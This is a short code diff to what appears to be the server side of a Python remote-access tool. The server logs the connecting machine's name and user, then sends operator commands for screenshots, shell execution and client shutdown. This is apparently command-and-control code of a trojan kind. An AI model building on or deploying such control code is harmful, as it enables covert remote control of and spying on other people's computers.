@@ -40,22 +40,23 @@ def recvFile(client_socket):
 # this is our client-handling thread
 def handle_client(client_socket):
 
+    # get a client
+    data = client_socket.recv(1024).split("#")
+    print "[+] Computer name: %s Username: %s" % (data[0],data[1])
+
     # send back a packet
     while(1):
 
-        try:
-            cmd = raw_input(">>> ")
-            client_socket.send(cmd)
-            if cmd == "screenshot":
-                recvFile(client_socket)
-            elif cmd == "kill-client":
-                data = client_socket.recv(1024)
-                print "[-] %s" % data
-            elif cmd[0] == "$":
-                data = client_socket.recv(1024)
-                print data.decode('gbk')
-        except:
-            print "Error!"
+        cmd = raw_input(">>> ")
+        client_socket.send(cmd)
+        if cmd == "screenshot":
+            recvFile(client_socket)
+        elif cmd == "kill-client":
+            data = client_socket.recv(1024)
+            print "[-] %s" % data
+        elif cmd[0] == "$":
+            data = client_socket.recv(1024)
+            print data.decode('gbk')
 
 # this is the help
 def help():
